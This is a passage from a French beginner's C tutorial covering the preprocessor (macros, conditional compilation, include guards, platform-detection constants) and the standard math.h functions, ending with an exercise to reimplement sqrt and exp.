quelque peu restrictif). Réaliser des inclusions : c'est un cas commun que nous avons déjà vu dès le premier code. Le préprocesseur inclut tout le contenu d'un fichier d'en-tête dans un autre fichier, soit d'en-tête soit source. Définir des macros : une macro est un substitut à un morceau de code, qui peut éventuellement prendre des paramètres. Il suffit de définir la macro et de l'utiliser dans le code. Après le passage du préprocesseur, tous les appels à cette macro seront remplacés par le code associé. Si vous êtes habitués au monde de la bureautique et des traitements de texte, vous devez certainement savoir ce que c'est exactement. Nous étudierons les macros dans la deuxième partie. Permettre la compilation conditionnelle : le préprocesseur permet également de définir le code à compiler. Cela permet d'écrire du code pour plusieurs plate-formes ou systèmes d'exploitation dans le même fichier source. On peut par exemple imaginer du code spécifique à Linux et à Windows ; dans ce cas, il suffira de préciser lors de l'écriture du code quelle partie du code doit être compilée et le préprocesseur supprimera l'autre. Nous étudierons des exemples dans la troisième partie. Exemple d'utilisation avec les inclusions Nous avons vu dès le début du cours comment inclure des fichiers d'en-tête avec la directive #include , mais sans jamais expliquer ce qu'elle faisait. Son but est très simple : inclure le contenu d'un fichier dans un autre fichier. Ainsi, si jamais l'on se retrouve avec deux fichiers comme ceux-ci avant la compilation : /* Fichier d'en-tête fichier.h */ #ifndef FICHIER_H #define FICHIER_H extern int glob_var ; extern void Func1 ( int ); extern long Func2 ( double , char ); #endif /* Fichier source fichier.c */ #include \"fichier.h\" void Func1 ( int arg ) { /* du code */ } long Func2 ( double arg , char c ) { /* du code */ } On ne se retrouve qu'avec un seul fichier à l'arrivée : /* Fichier source fichier.c */ extern int glob_var ; extern void Func1 ( int arg ); extern long Func2 ( double arg , char c ); void Func1 ( int arg ) { /* du code */ } long Func2 ( double arg , char c ) { /* du code */ } On peut voir que le contenu de fichier.h (une variable globale et deux prototypes) a été inclus dans fichier.c et toutes les directives de préprocesseur ont disparu. C'est ce qui se passe chaque fois que l'on inclut un fichier d'en-tête. D'ailleurs, si vous utilisez gcc , vous pouvez compiler avec l'option -E pour voir le code source après le passage du préprocesseur. Pour ceux qui utilisent Code::Blocks comme IDE , il est possible de faire pareil : allez dans Project -> Build Options -> Other Options et ajouter -save-temps -masm=intel . Cette option sauvegardera tous les fichiers générés par la compilation. Le code après le passage du préprocesseur est contenu dans les fichiers .i . Mais comme nous l'avons dit, le préprocesseur ne se limite pas à des inclusions. Examinons sans plus tarder ses possibilités. Une directive : #define Comme nous l'avons dit dans la partie précédente, le préprocesseur permet la définition de macros, c'est à dire des substituts à des morceaux de code. Pour créer une macro, il faut trois éléments. #define : cette directive va nous permettre de définir une macro. Le nom de la macro : par convention, celui-ci est écrit en majuscules. On peut choisir le nom que l'on veut, à condition de respecter les mêmes règles que pour les variables. La définition : c'est le code que l'on souhaite substituer. Nous verrons qu'il est également possible de rajouter des paramètres à nos macros. Des macros simples Une définition simple Prenons un exemple très simple : je définis une macro qui substitue l'identificateur TAILLE à la valeur 100. /* Dans le cas d'une définition simple comme celle-ci, on parle souvent de constante de préprocesseur. */ #define TAILLE 100 Ce code signifie que chaque fois que l'on appellera TAILLE dans le code, le préprocesseur remplacera la macro ( TAILLE ) par sa définition (100). Voici un code illustrant le principe. #include <stdio.h> #define TAILLE 100 int main ( void ) { int variable = 5 ; /* On multiplie par TAILLE */ variable *= TAILLE ; printf ( \"Variable vaut : %d \\n \" , variable ); /* On additionne TAILLE */ variable += TAILLE ; printf ( \"Variable vaut : %d \\n \" , variable ); return 0 ; } Ce code sera remplacé, après le passage du préprocesseur, par celui ci-dessous. int main ( void ) { int variable = 5 ; variable *= 100 ; printf ( \"Variable vaut : %d \\n \" , variable ); variable += 100 ; printf ( \"Variable vaut : %d \\n \" , variable ); return 0 ; } Je n'ai pas inclus le contenu de <stdio.h> car celui-ci est trop long et trop compliqué pour le moment. Néanmoins, l'exemple permet d'illustrer le principe des macros et surtout leur avantage : il suffit de changer la définition de la macro pour que le reste du code s'adapte. Illustrons : on veut changer 100 par 200. Le seul problème est qu'on utilise beaucoup cette valeur, disons 50 fois dans le code. Sans macro, il faudrait changer toutes les valeurs une par une, donc faire 50 modifications. Avec une macro, il suffit de changer la définition et tout le code s'adapte ensuite. Macros dans d'autres macros On peut même faire encore mieux : on peut utiliser une macro dans une autre macro. Imaginez que vous souhaitiez calculer le nombre de pixels d'une fenêtre. Vous avez trois macros : la largeur, la hauteur et le total. Il est possible d'appeler les macros LARGEUR et HAUTEUR directement dans la macro TOTAL et ainsi obtenir le nombre de pixels. #define HAUTEUR 1440 #define LARGEUR 700 #define TOTAL (HAUTEUR * LARGEUR) printf ( \"Total = %d pixels \\n \" , TOTAL ); Si j'explicite les étapes, j'obtiens les codes suivants. printf ( \"Total = %d pixels \\n \" , ( HAUTEUR * LARGEUR )); printf ( \"Total = %d pixels \\n \" , ( 1440 * 700 )); On obtient bien au final le nombre total de pixels. L'avantage ? Non seulement on s'évite des modifications en cas de changement, mais ça va également plus vite à écrire que HAUTEUR * LARGEUR. Les parenthèses ne sont pas obligatoires, mais elles sont fortement recommandées et nous verrons pourquoi par la suite. Ce qu'il faut retenir c'est qu'il est possible d'utiliser des macros dans d'autres macros, mais également qu'il est possible de faire des opérations (tous les signes mathématiques sont utilisables, c'est à dire +, -, *, / et %). Allez, exercice ! Faites-moi une macro qui additionne le résultat de deux autres macros. La première macro multiplie un nombre choisi (disons 100) par trois et la deuxième le divise par deux. La correction est sur past.awesom.eu . D'autres définitions Jusqu'à maintenant, on s'est contenté de macros qui n'ont pour définition que des valeurs numériques. Fort heureusement, il est possible d'avoir d'autres définitions. Nous venons de voir qu'il était possible qu'une définition soit composée d'une ou plusieurs macros, mais ce n'est pas tout. Elle peut également être composée de caractères voire même de fonctions, de boucles et de conditions. Illustrons cela. #define HELLO puts(\"Hello world!\") Je défini la macro HELLO comme étant un substitut du code puts(\"Hello world!\") . Vous noterez que je ne mets pas de point-virgule à la fin de la définition. La plupart des programmeurs font ça par convention. Dans ce cas, il ne faut pas oublier de le rajouter lorsqu'on utilise la macro. #define HELLO puts(\"Hello world!\") int main(void) { HELLO; return 0; } Avec paramètre(s) Pour l'instant, nous ne faisons que manipuler des macros déjà fixées. Or il serait bien de pouvoir faire comme pour les fonctions, c'est à dire transmettre des paramètres à la macro. C'est possible et c'est même la principale utilisation des macros : agir sur des paramètres. Pour déclarer une macro avec des paramètres, c'est très simple, on rajoute des parenthèses, comme pour les fonctions, en séparant les paramètres par des virgules. #define MACRO(paramètres) définition Illustrons ce nouveau concept avec un exemple ludique : nous allons écrire deux macros : RAD qui convertira un angle en radian et DGR qui fera l'inverse. Pour ceux qui ne connaissent pas, un radian vaut approximativement 57.29 degrés. Pour passer de l'un à l'autre, on fait ceci : Conversion de $x$ degrés en radians : $\\frac{\\pi \\times x}{180}$ Conversion de $x$ radians en degrés : $\\frac{180 \\times x}{\\pi}$ Voici un exemple d'exécution de ce code. Donnez un angle en degrés : 57.29 57.290 degrés = 1.000 radians Donnez un angle en radians : 3.1415 3.142 radians = 180.024 degrés Je vous laisse coder cet exemple. Aidez-vous de la correction ici si vous avez vraiment du mal. Appliquons encore ce concept avec un deuxième exercice : créons la macro MIN qui renvoie le minimum entre deux nombres (exercice bateau classique je l'accorde, dont la correction se trouve ici ). Quelque chose a dû vous frapper dans les corrections : pourquoi écrire (x) et pas simplement x ? Les inconvénients Évidemment, les macros avec des paramètres présentent des dangers. Le plus gênant est qu'il faut parfois surparenthèser pour éviter toute ambigüité. En effet, si l'on n'y prend pas garde, on peut avoir des surprises dues à la priorité des opérateurs. Prenons l'exemple d'une macro MUL. #define MUL(a, b) (a * b) Tel quel, le code peut réserver des surprises. Si en effet j'appelle la macro comme ceci : MUL ( 2 + 3 , 4 + 5 ) J'obtiens comme résultat 19 (la macro sera remplacée par 2 + 3 * 4 + 5 ) et non 45, le résultat attendu. Pour garantir la bonne marche de la macro, je dois rajouter des parenthèses. #define MUL(a, b) ((a) * (b)) Dans ce cas, j'obtiens bien le résultat souhaité, c'est-à-dire 45 ( (2 + 3) * (4 + 5) ). Je vous conseille de rajouter des parenthèses en cas de doute pour lever toute ambigüité. Je tiens à terminer cette sous-partie en vous mettant en garde par rapport à un autre danger appelé effet de bord . Un effet de bord est un effet indésirable. Il apparait souvent dans les macros où un paramètre est réutilisé plusieurs fois. #define CARRE(a) ((a) * (a)) Un appel tel que le suivant : CARRE ( a ++ ) entrainera le code suivant : (( a ++ ) * ( a ++ )) On remarque que l'opérateur ++ est appliqué deux fois, ce qui rendra le code faux. Faites donc attention quand vous déclarez des macros que celles-ci n'entrainent pas des effets de bord indésirables. Sur plusieurs lignes Si jamais notre macro est un peu longue, plutôt que de la définir sur une seule ligne, il est possible de le faire sur plusieurs. On utilise pour cela le symbole \\ chaque fois que l'on veut aller à la ligne. #define MACRO puts(\"Hello world!\"); \\ putchar('a'); \\ printf(\"%d\", 2 + 3) int main ( void ) { MACRO ; return 0 ; } Après le passage du préprocesseur, le fichier source ressemblera à celui ci-dessous. int main ( void ) { puts ( \"Hello world!\" ); putchar ( 'a' ); printf ( \"%d\" , 2 + 3 ); return 0 ; } Cependant, les macros sur plusieurs lignes présentent également un inconvénient : on peut avoir des problèmes d'interprétation, comme le prouve l'exemple suivant. #include <stdio.h> #define SWAP(a, b, tmp)\\ (tmp) = (a);\\ (a) = (b);\\ (b) = (tmp); int main ( void ) { int a [ 3 ] = { 1 , 2 , 3 }; int b [ 3 ] = { 2 , 4 , 6 }; int tmp ; int itr ; for ( itr = 0 ; itr < 3 ; ++ itr ) SWAP ( a [ itr ], b [ itr ], tmp ); for ( itr = 0 ; itr < 3 ; ++ itr ) printf ( \"%d %d \\n \" , a [ itr ], b [ itr ]); return 0 ; } Contrairement à ce qui est souhaité, seule la première instruction de la macro fera partie du corps de la boucle, les trois autres seront situés en dehors de celui-ci. En effet, le remplacement produira en vérité le code suivant (notez l'instruction vide à la fin qui résulte de l'ajout d'un point-virgule à la fin de l'appel à la macro SWAP ) : for ( itr = 0 ; itr < 3 ; ++ itr ) ( tmp ) = ( a ); ( a ) = ( b ); ( b ) = ( tmp ); ; Une solution simple à ce problème consiste à utiliser une boucle do { } while . De cette manière, le corps de la macro ne constitue plus qu'une seule instruction avec le point-virgule suivant l'appel à la macro , celui-ci étant nécessaire pour terminer une instruction do {} while (ce qui, finalement, permet d'uniformiser les appels de macro et les appels de fonctions) #include <stdio.h> #define SWAP(a, b, tmp)\\ do {\\ (tmp) = (a);\\ (a) = (b);\\ (b) = (tmp);\\ } while (0) int main ( void ) { int a [ 3 ] = { 1 , 2 , 3 }; int b [ 3 ] = { 2 , 4 , 6 }; int tmp ; int itr ; for ( itr = 0 ; itr < 3 ; ++ itr ) SWAP ( a [ itr ], b [ itr ], tmp ); for ( itr = 0 ; itr < 3 ; ++ itr ) printf ( \"%d %d \\n \" , a [ itr ], b [ itr ]); return 0 ; } Des macros sans définition Comme l'indique le titre, il est possible de créer des macros sans les définir, ce qui fait qu'on créé un substitut à un code inexistant. Exemple : #define MACRO Ici, MACRO est une macro qui n'a aucune définition, aucun code associé. Pourtant, cette technique est souvent utilisée. Nous allons voir comment dans la partie suivante. Des directives de condition Les directives #if, #elif, #else et #endif Ces quatre directives de préprocesseur font partie de ce que l'on appelle des directives de condition qui permet d'exécuter ou non du code en fonction de la validité d'une condition (si la condition est vraie, le code est exécuté sinon il est ignoré). Les trois premières correspondent à if , else if et else ; la dernière est obligatoire et conclue toute condition. Voici un exemple très banal dans lequel on teste si une macro est négative, nulle ou positive. #include <stdio.h> #define A 2 #if (A) < 0 #define B puts(\"A < 0\") #elif (A) > 0 #define B puts(\"A > 0\") #else #define B puts(\"A == 0\") #endif int main ( void ) { B ; return 0 ; } defined Cette directive, associée à celles ci-dessus, permet de tester l'existence ou la non-existence d'une constante. Le principe est simple : si la constante à tester est déjà définie, on exécute le code associé, sinon il est supprimé. Cette technique est utilisé pour produire des programmes portables. En effet, chaque système et chaque compilateur définissent une constante qui lui est propre. On a donc une constante pour Windows, une pour Mac, une pour Linux, mais également des constantes pour gcc, Visual Studio, MinGW , etc. En testant si une constante existe on peut déterminer sur quelle plate-forme et avec quel compilateur on compile et adapter le code en conséquence. Il est cependant important de noter que ces constantes ne sont pas standards . Autrement dit, elles peuvent varier selon plusieurs paramètres. Renseignez-vous bien lorsque vous voudrez les utiliser. Voici un exemple de code qui teste si l'on est sous Windows 32 ou 64 bits ou bien sous Linux ou MacOS pour inclure un fichier d'en-tête spécifique au système d'exploitation cible (celui-ci étant le même pour Linux et MasOS). /* si on est sous Mac ou Linux */ #if defined __APPLE__ || defined linux #include <unistd.h> /* ou bien si on est sous Windows 32 bits ou 64 bits */ #elif defined __WIN32__ || defined __WIN64__ #include <windows.h> #endif Bien entendu, les autres opérateurs de conditions sont eux aussi utilisables. Les directives #ifdef et #ifndef La première directive signifie « si la constante est définie », la deuxième étant son contraire, « si la constante n'est pas définie ». Elles sont en quelque sorte des \"raccourcis\" de defined . En effet, si vous n'avez qu'une seule constante à tester, il est plus rapide d'utiliser ces deux directives que defined . Illustrations avec un code basique dans lequel on ne teste que pour Windows et Linux. #ifdef __WIN32__ /* à la place de #if defined __WIN32__ */ #include <windows.h> #endif #ifdef linux /* à la place de #elif defined linux */ #include <unistd.h> #endif Sécurisation d'un fichier d'en-tête L'avantage de cette technique est que l'on peut sécuriser les fichiers d'en-tête. En effet, lorsque l'on créé un fichier d'en-tête, il faut toujours faire attention aux inclusions infinies . Cela peut arriver quand un fichier d'en-tête 1 inclut un fichier d'en-tête 2 qui lui-même inclut 1. Le préprocesseur rentre dans une sorte de boucle infinie qui fait au final planter la compilation. Pour éviter ces cas, je vous avais fourni un code à mettre obligatoirement à chaque création de fichier d'en-tête. Il est maintenant temps d'expliquer exactement son fonctionnement. Je vous remets le code en dessous ; sauriez-vous l'expliquer sans regarder la réponse ? #ifndef FICHIER_H #define FICHIER_H #endif #ifndef FICHIER_H : si la constante associée au fichier n'a jamais été défini, le préprocesseur rentre dans la condition et poursuit l'exécution du code. #define FICHIER_H : on définit la constante du fichier. La prochaine fois, la condition sera fausse et le fichier ne sera pas inclus. #endif : termine la condition. Ce code est simple, mais il permet d'éviter des inclusions infinies et donc des problèmes. Je vous conseille donc très fortement de l'utiliser chaque fois que vous créez un fichier d'en-tête. Constantes pré-définies Macros standards La norme prévoit que quatre constantes de préprocesseur sont définies (cf norme C89 - 3.8.8 Predefined macro names). Ces quatre macros sont __LINE__ (le numéro de la ligne actuelle), __FILE__ (le nom de fichier courant), __DATE__ (la date de compilation du fichier, sous la forme Mois / Jour / Année) et __TIME__ (l'heure de la compilation, sous la forme hh:mm:ss). Les trois premieres sont des chaines de caractères, la dernière un entier. Je vous invite à tester le code ci-dessous chez vous. #include <stdio.h> int main ( void ) { puts ( __FILE__ ); puts ( __DATE__ ); puts ( __TIME__ ); printf ( \"%d \\n \" , __LINE__ ); return 0 ; } Détecter le compilateur et le système Je tiens à conclure cette partie en vous offrant une liste de quelques constantes courantes. Bien entendu, cette liste n'est pas exhaustive, mais elle contient la plupart des constantes servant à définir le système d'exploitation et / ou le compilateur. Je le répète encore une fois : ces constantes ne sont pas standards et peuvent donc varier. Systèmes d'exploitation Windows : _WIN32 (32 bits) ou _WIN64 (64 bits) GNU/Linux : Linux ou __linux__ Apple : __APPLE__ ou __MACH__ FreeBSD : __FreeBSD__ NetBSD : __NetBSD__ Solaris : sun ou __SVR4 Une liste plus complète des systèmes d'exploitation est disponible ici . Compilateurs Visual C++ : _MSC_VER GCC : versions : __GNUC__ , __GNUC_MINOR__ ou __GNUC_PATCHLEVEL__ Borland : __TURBOC__ ou __BORLANDC__ MinGW : __MINGW32__ Cygwin : __CYGWIN__ ou __CYGWIN32__ Une liste plus compète des compilateurs est disponible ici . Il existe encore beaucoup d'autres constantes prédéfinies, comme pour connaitre la version du compilateur ou le nom de la fonction courante par exemple. Je ne les mets pas ici car elles sont très nombreuses, mais vous en connaissez l'existence, si jamais il y a besoin un jour. Le préprocesseur est une notion assez simple à comprendre et particulièrement puissante quand on le connait. Cependant, malgré ses nombreux avantages, il possède également des défauts, notamment celui de rendre la correction d'un code erroné plus difficile. Enfin, je tiens à préciser que nous n'avons pas tout appris sur le préprocesseur. Si jamais vous voulez approfondir vos connaissances, je vous invite à lire le tutoriel de Pouet_forever . Le chapitre suivant nous permettra de découvrir l'en-tête standard <math.h> , ce qui vous permettra de voir l'intérêt des fichiers d'en-tête, d'améliorer vos connaissances sur le C et les mathématiques et de pratiquer un peu. Que de bonnes choses ! L'en-tête Dans les chapitres précédents, on a vu comment bien organiser notre code avec de fonctions. On a aussi vu comment regrouper ces fonctions de façon cohérente dans des fichiers séparés, en utilisant des fichiers d'en-tête. Cela nous mène directement au concept de bibliothèque. Ce sont des fichiers dans lesquelles on va regrouper des fonctions, qu'on pourra réutiliser au besoin. Ces bibliothèques peuvent contenir toute sorte de fonctions : fonctions mathématiques, fonctions de gestion de la mémoire, etc. Le langage C normalise quelques bibliothèques de base, qui seront disponibles avec n\"importe quel compilateur sous n'importe quel système d'exploitation (à condition de ne pas utiliser un environnement trop exotique). On peut notamment citer la bibliothèque <math.h> , qui rassemble quelques fonctions mathématiques. Dans ce chapitre, nous allons découvrir ce que cette bibliothèque a dans le ventre ! NB : il se peut que vous n'ayez pas le niveau mathématique pour tout comprendre. Dans ce cas, lisez quand même le chapitre, même si vous ne comprenez pas tout. Les bibliothèques Les bibliothèques en informatique Je tiens à attirer votre attention sur le fait que la bibliothèque mathématique du langage C est une bibliothèque un peu spéciale . Celle-ci se comporte comme une bibliothèque tierce, soit une bibliothèque qui se rajoute par-dessus la bibliothèque standard. Les bibliothèques peuvent être présentés sous forme de code source ou de fichiers binaires à lier à vos programmes. Dans les grandes lignes, il existe deux grand types de bibliothèques : les bibliothèques statiques, et les bibliothèques dynamiques. Avec une bibliothèque statique, le code de la bibliothèque est inclus dans l'exécutable lors de la compilation. Ce dernier est donc plus important, il prend plus de place. Une bibliothèque dynamique est un fichier utilisé par un exécutable, mais n'en faisant pas partie. Ce fichier contient des fonctions qui pourront être appelées pendant l'exécution d'un programme, sans que celles-ci soient incluses dans son exécutable. Il faut dans ce cas fournir la bibliothèque avec le programme. Les systèmes d'exploitations récents sont pratiquement tous multitâche : ils permettent d'exécuter plusieurs programmes \"en même temps\". Il arrive donc que certains programmes utilisent les mêmes bibliothèques en même temps. Avec des bibliothèques dynamiques, il est possible de ne charger celles-ci qu'une seule fois en mémoire et de laisser tous les programmes en utiliser la même copie. On parle alors de bibliothèques partagées . Ces bibliothèques sont donc des fichiers binaires, qui possèdent généralement les extensions suivantes : Bibliothèques statiques : .a : sous UNIX et GNU/Linux (pour A rchive) ; .lib : sous Microsoft Windows ( LIB rary). Bibliothèques dynamiques : .so : sous UNIX et GNU/Linux ( S hared O bject) ; .dylib : sous Mac OS X ( Dy namic Lib rary) ; .dll : sous Microsoft Windows ( D ynamically L inkable L ibraries). Notre fameuse bibliothèque mathématique se nomme libm et est une bibliothèque statique. Celle-ci ne se lie au programme que sous les systèmes de type UNIX et GNU/Linux (Windows le fait automatiquement). Lier une bibliothèque À savoir, il est courant de voir sur la toile la traduction anglaise du verbe lier : link . Certains parlent même de \" linkage d'une bibliothèque\", et utilisent l'expression \"J'ai linké la bibliothèque mathématique\". En bon francophiles, nous allons utiliser le terme lier par la suite. Afin de lier une bibliothèque sous GCC et MinGW , on procède ainsi : -l<bibliothèque> Si vous compilez en ligne de commande, cela donnera dans notre cas : gcc main.c -lm # m comme mathématiques Pour lier une bibliothèque, il faut d'abord mettre les fichiers au bon endroit. S'il s'agit d'une bibliothèque statique, il faut la mettre dans le bon dossier. Nous avons alors deux choix. Le premier, c'est de mettre tous les fichiers dans le dossier du compilateur. Avec Code::Blocks , il faut la mettre dans le dossier lib situé dans le répertoire du compilateur. Avec Visual C++ , il faut la mettre dans le dossier C:\\Program Files (x86)\\Microsoft Visual Studio xx.x\\VC\\lib . Avec xCode , il faut la mettre dans le dossier <Racine Disque>/Bibliothèque/Frameworks . Pour ceux qui compilent à la main , il suffit d'ajouter les fichiers dans le dossier lib du compilateur. Ça semble logique, mais c'est assez embêtant : on se retrouve avec des dossiers remplis de bibliothèques dont on ne sait plus d'où elles viennent, désinstaller un logiciel demande de sauvegarder toutes les bibliothèques installées, etc. Bref, pas très pratique. Pour pallier à ces problèmes, il y a une deuxième solution : on crée un dossier indépendant, dans lequel on crée un sous-dossier par bibliothèque. Cela permet de bien organiser ses fichiers, d'être indépendants des logiciels utilisés et est plus facile à entretenir. Le choix de la méthode est votre. Si au contraire il s'agit d'une bibliothèque dynamique, c'est tout simple, celle-ci doit être mise dans le répertoire du projet. Ensuite, il faut modifier les propriétés du projet pour qu'il lie bien la bibliothèque au projet. La méthode varie selon que vous êtes avec : Code::Blocks : Ouvrez ou créez un projet puis allez dans Project -> Build options -> Linker settings -> Other linker options , insérez ensuite tout le texte nécessaire dans la zone de texte. Visual Studio : Il suffit de rajouter la ligne suivante chaque fois que vous voulez lier une bibliothèque, en remplaçant non_de_la_lib par le nom de la bibliothèque à linker. #pragma comment (lib, \"nom_de_la_lib.lib\") Il est également possible de l'ajouter comme élément du projet. Découvrir Nous allons maintenant étudier la bibliothèque mathématiques du langage C afin que vous sachiez quoi faire par la suite dans le TP. Le fichier d'en-tête de cette bibliothèque se nomme <math.h> contient un certain nombre de déclarations de fonctions mathématiques ainsi qu'une macro. Vous le savez, tout comme <stdio.h> ou <stdlib.h> , on inclue le fichier d'en-tête mathématiques de cette manière : #include <math.h> La norme C89 précise que la bibliothèque mathématique est composée d'une macro et de 22 fonctions. Cependant, je vous présenterai seulement les fonctions les plus connues et les plus utiles. Une macro utile Pour commencer, nous allons rapidement parler de la macro HUGE_VAL , qui représente la valeur de type double la plus élevée que l'ordinateur peut gérer. Cette valeur dépend de la machine de l'utilisateur. Cette macro est principalement utilisée lors des retours de fonctions afin de savoir si ces dernières se sont bien exécutées. Sinus, cosinus et tangente Les premières fonctions disponibles dans cette bibliothèque sont les fonctions trigonométriques sinus , cosinus , et tangente . Cela doit vous rappeler quelque chose que vous avez vu dans vos cours de mathématiques. Les prototypes de ces trois fonctions sont les suivants : ​ double sin(double x); double cos(double x); * double tan(double x); Ces fonctions prennent un nombre réel en radians et retournent un résultat appartenant à l'intervalle $[-1 ; +1]$ Voici un exemple d'utilisation. #include <stdio.h> #include <math.h> int main ( void ) { double x , y , z ; x = sin ( 0.028 ); y = cos ( 0.028 ); z = tan ( 0.028 ); printf ( \"x = %.10f \\n y = %.10f \\n z = %.10f\" , x , y , z ); return 0 ; } x = 0.0279963415 y = 0.9996080256 z = 0.0280073196 Comme vous pouvez le voir, j'ai indiqué à la fonction printf la précision, c'est-à-dire le nombre de chiffres après la virgule que je souhaite afficher. Mesurer un angle Si les fonctions sinus, cosinus et tangente sont disponibles, c'est aussi le cas de leurs fonctions réciproques, à savoir arc-sinus, arc-cosinus et arc-tangente : double asin(double x); double acos(double x); double atan(double x); Ces fonctions attendent un paramètre appartenant à $ [-1 ; +1]$ et retournent un résultat appartenant à $\\left[ frac{-\\pi}{2} ; frac{+\\pi}{2} \\right]$. #include <math.h> #include <stdio.h> int main ( void ) { double x , y , z ; x = asin ( 0.0279963415 ); y = acos ( 0.9996080256 ); z = atan ( 0.0280073196 ); printf ( \"x = %f \\n y = %f \\n z = %f \\n \" , x , y , z ); return 0 ; } x = 0.028000 y = 0.028000 z = 0.028000 Logarithmes Commençons par les fonctions concernant les logarithmes. Je nomme log et log10 : double log(double x); double log10(double x); Comme la plupart des fonctions de la bibliothèque mathématique, elles prennent comme argument un double et renvoient un double< . La fonction log renvoie le logarithme népérien du nombre passé en paramètre, alors que log10 renvoie le logarithme en base 10. Bien entendu, le paramètre doit appartenir à $] 0 ; +\\infty [$ ; la fonction retourne alors un résultat appartenant à $\\mathbb{R}$. #include <math.h> #include <stdio.h> int main ( void ) { double x , y , z ; x = log ( 4242 ); y = log10 ( 4242 ); z = log10 ( 1000000 ); printf ( \"x = %f \\n y = %f \\n z = %f \\n \" , x , y , z ); return 0 ; } x = 8.352790 y = 3.627571 z = 6.000000 Exponentielle Passons à la fonction exp , qui prend un nombre réel et renvoie un résultat appartenant à $] 0 ; +\\infty [$. Simple précaution : cette fonction ayant une croissance très rapide, attention si vous manipuler de grands nombres à ne pas dépasser la capacité maximale d'un double . double exp ( double x ); #include <math.h> #include <stdio.h> int main ( void ) { double x = exp ( 3 ); printf ( \"x = %f \\n \" , x ); return 0 ; } x = 20.085537 Puissances Étudions maintenant la fonction pow . double pow ( double x , double y ); Elle élève le nombre x à la puissance y ($x&#94;y$). Cette fonction est très lourde et lente à l'exécution, je vous recommande donc de ne pas l'utiliser pour les calculs de faibles puissances. Mais, pourquoi cette fonction est-elle si lente ? La raison est simple : elle est très puissante, puisque elle gère les nombres et les exposant négatifs, ce qui n'est pas une mince affaire. Cependant, il existe quelques cas que pow est incapable de gérer. Il n'est pas possible de lui fournir un nombre négatif et un exposant fractionnaire sans quoi vous lui demandez de calculer la racine d'un nombre négatif (ce qui est impossible dans le cas de nombres réels). Il n'est pas possible de lui passer un nombre nul et un exposant nul en même temps ($0&#94;0$ n'est pas calculable). Il n'est pas possible de lui transmettre un nombre nul et un exposant négatif sans quoi vous lui demandez de diviser un nombre par zéro (ce qui est mathématiquement impossible). #include <math.h> #include <stdio.h> int main ( void ) { double x , y , z ; x = pow ( 5 , 2 ); y = pow ( 2 , - 2 ); z = pow ( 3.14 , 4 ); printf ( \"x = %f \\n y = %f \\n z = %f \\n \" , x , y , z ); return 0 ; } x = 25.000000 y = 0.250000 z = 97.211712 Racine carrée L'en-tête <math.h> fournit aussi une fonction de calcul de la racine carrée d'un nombre. Ils 'agit de la fonction sqrt . Son prototype est le suivant : double sqrt ( double x ); La fonction sqrt renvoie la racine carrée du réel positif passé en paramètre. Elle renverra une erreur si vous tentez de calculer la racine carrée d'un réel négatif. #include <math.h> #include <stdio.h> int main ( void ) { double x = sqrt ( 25 ); printf ( \"x = %f \\n \" , x ); return 0 ; } x = 5.000000 Fonctions d'arrondis Cette rapide présentation de la bibliothèque mathématiques standard du C touche à sa fin, il ne nous reste plus qu'une poignée de fonctions à voir, notamment les fonctions d'arrondis. double ceil(double x); double floor(double x); La première, ceil , renvoie la partie entière supérieure du nombre x . À l'inverse, la fonction floor la partie entière inférieure du nombre passé en paramètre. Voici un petit code d'exemple : #include <math.h> #include <stdio.h> int main ( void ) { double x , y ; x = ceil ( 42.7 ); y = floor ( 42.7 ); printf ( \"x = %f \\n y = %f \\n \" , x , y ); return 0 ; } x = 43.000000 y = 42.000000 Autres fonctions sur les flottants Il nous reste ensuite quelques fonctions restantes, inclassables. J'ai nommé : double fabs(double x); double fmod(double x, double y); La fonction fabs retourne la valeur absolue de x , soit $|x|$. Pour ceux qui ne connaissent pas, la valeur absolue d'un nombre représente la partie numérique de ce dernier. $|1| = 1$ $|-42|= 42$ Pour finir la fonction fmod quand à elle, divise x par y puis renvoie le reste. Pour simplifier, elle effectue un modulo sur deux flottants. Elle est utile car le langage C ne nous autorise pas à utiliser l'opérateur % sur des flottants. #include <math.h> #include <stdio.h> int main ( void ) { double x , y ; x = fabs ( - 7 ); y = fmod ( 42 , 5 ); printf ( \"x = %f \\n y = %f \\n \" , x , y ); return 0 ; } x = 7.000000 y = 2.000000 TP : Recodons des fonctions mathématiques Fini la théorie, place à la pratique ! Votre mission, si vous l'acceptez : recoder quelques fonctions de la bibliothèques mathématiques, que vous connaissez bien désormais. Bien entendu, je vous aiderai à chaque fois en vous expliquant l'algorithme à utiliser par exemple. Enfin, avant de commencer, je vous livre une petite astuce : pour tester si votre fonction fonctionne correctement, pourquoi ne pas la comparer avec celle de la bibliothèque standard ? Et pour ce faire, pourquoi ne pas créer une macro qui donnerait le résultat retourné par votre fonction et par celle de la bibliothèque standard ? Racine carrée La première fonction que nous allons recoder est la racine carrée d'un réel positif. Pour cela, nous allons utiliser un très vieil algorithme appelé la méthode de Héron , du nom du mathématicien grec qui l'a découverte. Cette méthode est relativement simple : pour trouver $\\sqrt{A}$, on prend un nombre au hasard qu'on nomme $x_{n}$, et on utilise cette formule : $x_{n+1} = \\frac{x_n + \\frac{A}{x_n}}{2}$. Il suffit de répéter cette opération plusieurs fois, en remplaçant $x_{n}$ par la valeur calculée au tour d'avant. En faisant ainsi, le résultat converge vers $\\sqrt{A}$, la précision dépendant du nombre de répétitions de la récurrence. On doit calculer cette suite jusqu'à ce qu'on aie atteint une précision suffisante. Vous avez maintenant toutes les clefs en main pour recoder la fonction sqrt . Si vous avez du mal, jetez un œil à l'algorithme se trouvant ici . Quant à ceux qui veulent comparer leur code à la correction, en voici une . Testez donc si les valeurs retournées sont correctes. Exponentielle La deuxième fonction que nous allons faire sera l'exponentielle de base $e$, notée $\\exp(x)$ ou $e&#94;x$. Une implémentation naïve serait d'utiliser la fonction pow . C'est une idée, facile et rapide à coder, mais pas très optimisée : en effet, pow est une fonction assez lourde, autant choisir une autre solution : le développement limité . La formule est la suivante : $e&#94;x = 1 + x + \\frac{x&#94;2}{2!} + \\frac{x&#94;3}{3!} + \\ldots+ \\frac{x&#94;n}{n!} + o(x&#94;n)$. En gros, on doit calculer cette somme jusqu'à ce qu'on aie atteint une précision suffisante. Pour ceux qui ne savent pas, $n!$ est la factorielle d'un nombre et vaut $1 \\times 2 \\times 3 \\times \\ldots \\times (n - 1) \\times n$ soit $\\prod_{i = 0}&#94;n i$. Avant de vous lancer, je vous donne une dernière astuce : vous n'avez pas besoin de la fonction pow , ni de faire une fonction calculant la factorielle d'un nombre. Bon courage, vous pouvez y arriver ! [secret]{ Si vous ne voyez pas comment se passer de pow ou d'une fonction factorielle, dîtes-vous qu'il n'est pas nécessaire de recalculer toutes les 